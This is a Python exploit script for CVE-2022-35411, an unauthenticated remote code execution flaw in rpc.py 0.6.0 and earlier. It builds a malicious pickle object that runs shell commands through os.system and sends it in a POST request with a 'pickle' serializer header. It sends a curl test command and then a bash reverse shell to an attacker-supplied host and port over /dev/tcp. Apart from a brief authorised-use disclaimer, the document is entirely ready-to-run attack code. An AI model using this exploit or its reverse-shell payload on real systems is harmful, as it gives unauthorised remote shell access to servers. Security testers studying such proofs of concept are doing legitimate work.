#!/usr/bin/env python3
# Exploit Title: rpc.py <= 0.6.0 - Remote Code Execution (RCE)
# CVE: CVE-2022-35411
# Original Exploit Author: Elias Hohl
# Modified by: x7331 (07/25)
# Source: https://github.com/abersheeran/rpc.py
#
# Description:
# This exploit targets an unauthenticated RCE vulnerability in rpc.py caused by unsafe
# pickle deserialization. It allows arbitrary command execution via specially crafted
# POST requests with the 'pickle' serializer header.
#
# This version includes enhancements by x7331:
# - Command-line argument support with --lhost and --lport flags
# - Optional --target and --dry-run flags
# - Modular structure, better logging, and cleaner output
# - Reverse shell or test payload delivery
#
# DISCLAIMER: Use only on systems you own or have explicit permission to test.

import argparse
import requests
import pickle
import logging

DEFAULT_TARGET = "http://127.0.0.1:65432/sayhi"
HEADERS = {
    "serializer": "pickle"
}

def generate_payload(command: str) -> bytes:
    # Creates a malicious pickle object that executes the provided shell command
    class PickleRce:
        def __reduce__(self):
            import os
            return os.system, (command,)
    return pickle.dumps(PickleRce())

def exec_command(target_url: str, command: str) -> None:
    # Sends the malicious payload to the target server
    payload = generate_payload(command)
    try:
        requests.post(url=target_url, data=payload, headers=HEADERS, timeout=5)
    except requests.exceptions.RequestException as e:
        logger.error(f"Request failed: {e}")

def main(target: str, lhost: str, lport: str, dry_run: bool = False) -> None:
    logger.info(f"Target RPC.py instance: {target}")
    logger.info("Sending test payload (curl)")
    exec_command(target, "curl http://127.0.0.1:4321")

    if dry_run:
        logger.info("[*] Dry run selected; skipping reverse shell.")
        return

    logger.info("Sending reverse shell payload")
    shell_cmd = f'/usr/bin/bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"'
    exec_command(target, shell_cmd)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
    logger = logging.getLogger("rpc-rce")

    parser = argparse.ArgumentParser(
        description="Exploit for CVE-2022-35411 - rpc.py <= 0.6.0 unauthenticated RCE"
    )
    parser.add_argument("--lhost", required=True, help="Local host to receive reverse shell")
    parser.add_argument("--lport", required=True, help="Local port to receive reverse shell")
    parser.add_argument(
        "--target", default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--dry-run", action="store_true",
        help="Only send test curl payload, skip reverse shell"
    )

    args = parser.parse_args()
    main(args.target, args.lhost, args.lport, args.dry_run)
